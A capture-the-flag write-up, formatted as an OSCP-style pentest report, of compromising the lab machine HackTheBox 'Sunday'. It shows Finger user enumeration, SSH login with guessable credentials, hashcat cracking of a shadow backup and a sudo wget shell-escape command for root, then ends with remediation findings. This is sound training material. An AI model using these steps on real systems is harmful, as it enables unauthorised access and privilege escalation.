# HTB Sunday - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-25

---

## 0. Lesson Learned

Seclists is often the better choice for wordlists.

---

## 1. Executive Summary

An assessment was conducted against the target host Sunday. The system was found vulnerable to user enumeration via the Finger service, weak credential usage, and insecure sudo configurations allowing privilege escalation.

Initial access was obtained via SSH using guessed credentials. Privilege escalation was achieved through misconfigured sudo permissions, resulting in full root access.

---

## 2. Scope

- **Target:** 10.129.223.215
- **Environment:** HackTheBox Sunday (Retired Machine)
- **Testing Window:** 2026-3-25
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

```
nmap -p- -sCV 10.129.223.215 -T4 -oA sunday_tcp
```

Open ports:

- 79/tcp - finger
- 111/tcp - rpcbind
- 515/tcp - printer
- 6787/tcp - smc-admin
- 22022/tcp - ssh

Multiple services were exposed, including Finger and SSH on a non-standard port (22022), indicating potential entry points.

---

## 5. Enumeration

Users were enumerated with Finger:

```
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.223.215
```

Valid SSH users were identified:

```
sammy

sunny
```

---

## 6. Initial Access

Credentials were guessed for SSH access:

```
ssh sunny@sunday.htb -p 22022
```

SSH access confirmed valid credentials:

```
sunny : sunday
```

Weak password policy allowed successful authentication using predictable credentials.

---

## 7. Post-Exploitation

Sudo permissions were examined:

```
sudo -l
```

Revealing user `sunny` could execute `/root/troll` as root without a password. The output of this command appeared similar to the `id` command and appeared useless as a privilege escalation vector.

A backup of the `/etc/shadow` file was found at `/backup/shadow.backup` revealing password hashes for `sammy` and `sunny`.

The hashes were identified as SHA-256 Crypt:

```
hashid <hash>
```

And cracked with hashcat:

```
hashcat -m 7400 sunday.hashes /usr/share/wordlists/rockyou.txt
```

Revealing the credentials:

```
sunny : sunday

sammy : cooldude!
```

---

## 8. Privilege Escalation

Login as `sammy` via SSH:

```
ssh sammy@sunday.htb -p 22022
```

Sudo permissions examined:

```
sudo -l
```

Revealing that user `sammy` can run `wget` as root without a password indicating a privilege escalation vector.

Exploiting `wget` via GTFOBins instruction:

```
echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/file.sh

chmod +x /tmp/file.sh

sudo /usr/bin/wget --use-askpass=/tmp/file.sh 0
```

A root shell (`id=0`) was obtained using the `wget` sudo misconfiguration.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /home/sammy/user.txt
```

**Root Flag**: *REDACTED*

```
cat /root/root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** User Enumeration via Finger Service

**Severity:** Medium

**Description:**
The Finger service allowed unauthenticated users to enumerate valid system usernames.

**Impact:**
Attackers could identify valid user accounts and use them for further attacks such as brute force or credential spraying.

**Recommendation:**
Disable the Finger service if not required, or restrict access using firewall rules and access controls.

### **Finding:** Weak or Predictable Credentials

**Severity:** High

**Description:**
The system used predictable or easily guessable credentials (e.g., `sunny:sunday`).

**Impact:**
Attackers could gain unauthorized access to services such as SSH using valid credentials.

**Recommendation:**
Enforce strong password policies, eliminate default or guessable credentials, and implement account lockout mechanisms.

### **Finding:** Exposed Backup Files Containing Password Hashes

**Severity:** High

**Description:**
Sensitive backup files containing password hashes were accessible to unauthorized users.

**Impact:**
Attackers could retrieve the hashes and perform offline cracking to recover valid credentials.

**Recommendation:**
Restrict access to backup directories, encrypt sensitive data at rest, and ensure backups are stored securely.

### **Finding:** Insecure Sudo Configuration Allowing Arbitrary Command Execution

**Severity:** Critical

**Description:**
A user was allowed to execute a privileged binary (e.g., `troll`) via sudo without restrictions.

**Impact:**
Attackers could leverage the binary to execute commands as root and achieve full system compromise.

**Recommendation:**
Remove unnecessary sudo privileges, restrict execution of privileged binaries, and enforce least-privilege access controls.

### **Finding:** Insecure Sudo Configuration Allowing Shell Escape via Binary

**Severity:** Critical

**Description:**
A user was permitted to execute a binary (e.g., `wget`) via sudo that allowed shell escape or arbitrary command execution.

**Impact:**
Attackers could exploit the binary to execute commands as root and fully compromise the system.

**Recommendation:**
Avoid granting sudo access to binaries capable of shell execution, restrict sudo permissions to required commands only, and enforce least-privilege policies.

---

## 11. Appendix

Finger (`Port 79/tcp`) User Enumeration Script - 
[https://pentestmonkey.net/tools/user-enumeration/finger-user-enum](https://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

Names List for User Enum Script *(Better results than wfuzz list)* - 
[https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt)

`wget` GTFOBins Sudo Privilege Escalation - 
[https://gtfobins.org/gtfobins/wget/#shell](https://gtfobins.org/gtfobins/wget/#shell)